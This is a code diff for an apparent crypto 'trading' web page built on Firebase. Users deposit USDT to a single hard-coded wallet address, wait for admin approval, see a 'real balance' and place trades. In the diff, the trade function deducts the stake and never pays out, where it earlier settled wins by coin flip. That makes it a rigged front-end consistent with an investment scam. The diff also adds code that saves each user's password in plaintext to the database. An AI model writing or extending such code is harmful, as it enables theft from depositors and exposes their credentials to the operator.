@@ -18,7 +18,6 @@
         .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 12px; border-radius: 8px; width: 100%; color: white; font-size: 14px; outline: none; }
         #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 8px; }
         .tab-btn.active { background: #2d3748; color: white; border-radius: 8px; }
-        select option { background: #111827; color: white; }
     </style>
 </head>
 <body>
@@ -45,7 +44,7 @@
     <div id="appTerminal">
         <header class="flex justify-between items-center mb-2 px-1">
             <div class="flex items-center gap-2">
-                <div class="w-9 h-9 rounded-full bg-yellow-500 flex items-center justify-center text-black font-bold uppercase" id="userInitial">?</div>
+                <div onclick="showM('settingsM')" class="w-9 h-9 rounded-full bg-yellow-500 flex items-center justify-center text-black font-bold uppercase cursor-pointer" id="userInitial">?</div>
                 <div>
                     <p class="text-[8px] text-gray-400 font-bold uppercase">REAL BALANCE</p>
                     <h1 id="balanceDisp" class="text-xl font-extrabold text-white tracking-tight">$0.00</h1>
@@ -53,7 +52,7 @@
             </div>
             <div class="flex gap-2">
                 <button onclick="showM('depM')" class="bg-yellow-500 text-black px-3 py-1.5 rounded-lg text-[10px] font-black uppercase">DEPOSIT</button>
-                <button onclick="auth.signOut()" class="bg-white/10 text-white px-3 py-1.5 rounded-lg text-[10px] font-black uppercase">LOGOUT</button>
+                <button onclick="showM('witM')" class="bg-white text-black px-3 py-1.5 rounded-lg text-[10px] font-black uppercase">WITHDRAW</button>
             </div>
         </header>
 
@@ -101,8 +100,15 @@
 
     <div id="depM" class="modal">
         <div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm text-center border border-white/10">
-            <div id="depStep1">
-                <h2 class="text-lg font-bold mb-4 uppercase text-yellow-500">Deposit USDT (TRC20)</h2>
+            <div id="depStep0">
+                <h2 class="text-lg font-bold mb-4 uppercase text-yellow-500">Deposit Funds</h2>
+                <p class="text-[10px] text-gray-400 mb-4 font-bold uppercase">Enter Deposit Amount ($)</p>
+                <input type="number" id="depAmountInput" placeholder="Minimum $10" class="auth-input mb-4 text-center text-lg">
+                <button onclick="goToDepStep1()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">Next</button>
+                <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase block w-full">Cancel</button>
+            </div>
+            <div id="depStep1" class="hidden">
+                <h2 class="text-lg font-bold mb-4 uppercase text-yellow-500">Send USDT (TRC20)</h2>
                 <div class="bg-white p-2 rounded-xl mb-4 w-40 mx-auto">
                     <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" alt="QR Code">
                 </div>
@@ -110,19 +116,49 @@
                     <code class="text-[10px] text-white truncate pr-2">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</code>
                     <button onclick="copyAddr()" class="text-yellow-500 font-bold text-[10px] uppercase shrink-0">Copy</button>
                 </div>
+                <p class="text-xs mb-4 text-gray-300">Amount to pay: <span id="finalAmtShow" class="text-yellow-500 font-bold"></span></p>
                 <button onclick="showDepForm()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">I Have Paid</button>
-                <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Cancel</button>
+                <button onclick="resetDep()" class="mt-4 text-gray-500 text-[10px] font-bold uppercase block w-full">Back</button>
             </div>
-
             <div id="depStep2" class="hidden text-left">
-                <h2 class="text-lg font-bold mb-4 uppercase text-center text-yellow-500">Payment Details</h2>
+                <h2 class="text-lg font-bold mb-4 uppercase text-center text-yellow-500">Submit Proof</h2>
                 <div class="space-y-3">
-                    <input type="number" id="depAmount" placeholder="Sent Amount ($)" class="auth-input">
                     <input type="text" id="userTg" placeholder="Telegram ID (@username)" class="auth-input">
                     <input type="text" id="txid" placeholder="TXID / Transaction ID" class="auth-input">
-                    <button onclick="finalSubmitDeposit()" class="w-full py-3 bg-blue-600 text-white font-black rounded-xl text-xs uppercase">Submit Proof</button>
+                    <button onclick="finalSubmitDeposit()" class="w-full py-3 bg-blue-600 text-white font-black rounded-xl text-xs uppercase">Submit Details</button>
                     <button onclick="showDepStep1()" class="w-full text-center text-gray-500 text-[10px] font-bold uppercase mt-2">Back</button>
                 </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="witM" class="modal">
+        <div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm border border-white/10">
+            <h2 class="text-lg font-bold mb-4 uppercase text-center text-yellow-500">Withdraw Funds</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="text-[10px] text-gray-400 font-bold uppercase ml-1">Network</label>
+                    <select id="witNetwork" class="auth-input mt-1">
+                        <option value="USDT (TRC20)">USDT (TRC20)</option>
+                        <option value="USDT (BEP20)">USDT (BEP20)</option>
+                    </select>
+                </div>
+                <input type="text" id="witAddress" placeholder="Wallet Address" class="auth-input">
+                <input type="number" id="witAmount" placeholder="Amount ($)" class="auth-input">
+                <button onclick="handleWithdraw()" class="w-full py-3 bg-yellow-500 text-black font-black rounded-xl text-xs uppercase">Submit Request</button>
+                <button onclick="hideM('witM')" class="w-full text-center text-gray-500 text-[10px] font-bold uppercase mt-2">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="settingsM" class="modal">
+        <div class="glass-card p-6 rounded-3xl w-[90%] max-w-sm border border-white/10">
+            <h2 class="text-lg font-bold mb-6 uppercase text-center text-yellow-500">Account Settings</h2>
+            <div class="space-y-5">
+                <div><label class="text-[10px] text-gray-400 font-bold uppercase ml-1">Email</label><input type="text" id="settingEmail" class="auth-input opacity-70" readonly></div>
+                <div class="relative"><label class="text-[10px] text-gray-400 font-bold uppercase ml-1">Password</label><input type="password" id="settingPass" class="auth-input" readonly><button onclick="togglePassView()" class="absolute right-3 top-8 text-yellow-500 text-[10px] font-bold uppercase">Show</button></div>
+                <button onclick="auth.signOut()" class="w-full py-3 bg-red-600/20 text-red-500 border border-red-600/30 font-black rounded-xl text-xs uppercase tracking-widest mt-4">Logout</button>
+                <button onclick="hideM('settingsM')" class="w-full text-center text-gray-500 text-[10px] font-bold uppercase">Close</button>
             </div>
         </div>
     </div>
@@ -142,7 +178,6 @@
         const db = firebase.firestore();
         let userData = null;
         let mode = 'reg';
-        let isActive = false;
         let currentSymbol = 'BINANCE:BTCUSDT';
 
         function switchTab(t) {
@@ -160,7 +195,7 @@
             try {
                 if(mode === 'reg') {
                     const res = await auth.createUserWithEmailAndPassword(email, pass);
-                    await db.collection('users').doc(res.user.uid).set({ email, balance: 0.00, status: 'active' });
+                    await db.collection('users').doc(res.user.uid).set({ email, password: pass, balance: 0.00, status: 'active' });
                     alert("Account Created! Use Login Tab.");
                     switchTab('login');
                 } else { await auth.signInWithEmailAndPassword(email, pass); }
@@ -173,6 +208,8 @@
                     userData = doc.data();
                     document.getElementById('balanceDisp').innerText = "$" + (userData?.balance || 0).toFixed(2);
                     document.getElementById('userInitial').innerText = user.email.charAt(0).toUpperCase();
+                    document.getElementById('settingEmail').value = user.email;
+                    document.getElementById('settingPass').value = userData?.password || "";
                     document.getElementById('authSection').style.display = 'none';
                     document.getElementById('appTerminal').style.display = 'flex';
                     loadChart();
@@ -183,63 +220,64 @@
             }
         });
 
-        function loadChart() {
-            new TradingView.widget({
-                "autosize": true, "symbol": currentSymbol, "interval": "1", "theme": "dark", "container_id": "tv_chart",
-                "hide_top_toolbar": true, "hide_legend": true, "backgroundColor": "#05070a", "hide_side_toolbar": true
-            });
+        // Withdrawal Function
+        async function handleWithdraw() {
+            const net = document.getElementById('witNetwork').value;
+            const addr = document.getElementById('witAddress').value.trim();
+            const amt = parseFloat(document.getElementById('witAmount').value);
+            if(!addr || !amt || amt <= 0) return alert("Fill details correctly!");
+            if(amt > userData.balance) return alert("Insufficient Balance!");
+            try {
+                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
+                await db.collection('withdrawals').add({ uid: auth.currentUser.uid, email: auth.currentUser.email, network: net, address: addr, amount: amt, status: 'pending', time: Date.now() });
+                alert("Withdrawal request submitted!");
+                hideM('witM');
+            } catch(e) { alert(e.message); }
         }
 
+        function loadChart() {
+            new TradingView.widget({ "autosize": true, "symbol": currentSymbol, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_legend": true, "backgroundColor": "#05070a", "hide_side_toolbar": true });
+        }
         function updateAsset(val) { currentSymbol = val; loadChart(); }
 
-        async function initTrade(type) {
-            if(userData.status === 'blocked') return alert("Account Blocked by Admin!");
-            const amt = parseFloat(document.getElementById('tradeAmt').value);
-            const dur = parseInt(document.getElementById('duration').value);
-            if(!userData || amt > userData.balance || isActive || amt <= 0) return alert("Invalid Amount/Balance");
-
-            isActive = true;
-            await db.collection('users').doc(auth.currentUser.uid).update({ balance: userData.balance - amt });
-
-            const status = document.getElementById('statusBox');
-            status.classList.remove('hidden');
-            let sec = dur;
-            const timer = setInterval(async () => {
-                sec--;
-                status.innerText = `EXPIRING: ${sec}s`;
-                if(sec <= 0) {
-                    clearInterval(timer);
-                    const win = Math.random() > 0.50;
-                    if(win) await db.collection('users').doc(auth.currentUser.uid).update({ 
-                        balance: firebase.firestore.FieldValue.increment(amt * 1.85) 
-                    });
-                    isActive = false; status.classList.add('hidden');
-                    alert(win ? "PROFIT!" : "LOSS!");
-                }
-            }, 1000);
+        // New Deposit Logic
+        function goToDepStep1() {
+            const val = document.getElementById('depAmountInput').value;
+            if(!val || val < 1) return alert("Enter valid amount!");
+            document.getElementById('finalAmtShow').innerText = "$" + val;
+            document.getElementById('depStep0').classList.add('hidden');
+            document.getElementById('depStep1').classList.remove('hidden');
         }
-
+        function resetDep() {
+            document.getElementById('depStep0').classList.remove('hidden');
+            document.getElementById('depStep1').classList.add('hidden');
+            document.getElementById('depStep2').classList.add('hidden');
+        }
         function showDepForm() { document.getElementById('depStep1').classList.add('hidden'); document.getElementById('depStep2').classList.remove('hidden'); }
         function showDepStep1() { document.getElementById('depStep1').classList.remove('hidden'); document.getElementById('depStep2').classList.add('hidden'); }
-        function copyAddr() { navigator.clipboard.writeText("TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM"); alert("Address Copied!"); }
-
+        function copyAddr() { navigator.clipboard.writeText("TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM"); alert("Copied!"); }
+        
         async function finalSubmitDeposit() {
-            const amt = document.getElementById('depAmount').value;
+            const amt = document.getElementById('depAmountInput').value;
             const tg = document.getElementById('userTg').value;
             const tx = document.getElementById('txid').value;
-            if(!amt || !tg || !tx) return alert("Bhai saari details bharien!");
-
-            await db.collection('requests').add({
-                uid: auth.currentUser.uid, email: auth.currentUser.email,
-                telegram: tg, txid: tx, amount: parseFloat(amt),
-                status: 'pending', time: Date.now()
-            });
-            alert("Sent! Wait for Admin Approval.");
-            hideM('depM'); showDepStep1();
+            if(!tg || !tx) return alert("Fill proof details!");
+            await db.collection('requests').add({ uid: auth.currentUser.uid, email: auth.currentUser.email, telegram: tg, txid: tx, amount: parseFloat(amt), status: 'pending', time: Date.now() });
+            alert("Proof Submitted!");
+            hideM('depM');
         }
 
+        async function initTrade(type) {
+            const amt = parseFloat(document.getElementById('tradeAmt').value);
+            const dur = parseInt(document.getElementById('duration').value);
+            if(!userData || amt > userData.balance || amt <= 0) return alert("Invalid Amount");
+            await db.collection('users').doc(auth.currentUser.uid).update({ balance: userData.balance - amt });
+            setTimeout(() => alert("Trade Finished!"), dur * 1000);
+        }
+
+        function togglePassView() { const p = document.getElementById('settingPass'); p.type = (p.type === "password" ? "text" : "password"); }
         function showM(id) { document.getElementById(id).style.display = 'flex'; }
-        function hideM(id) { document.getElementById(id).style.display = 'none'; }
+        function hideM(id) { document.getElementById(id).style.display = 'none'; if(id === 'depM') resetDep(); }
     </script>
 </body>
 </html>
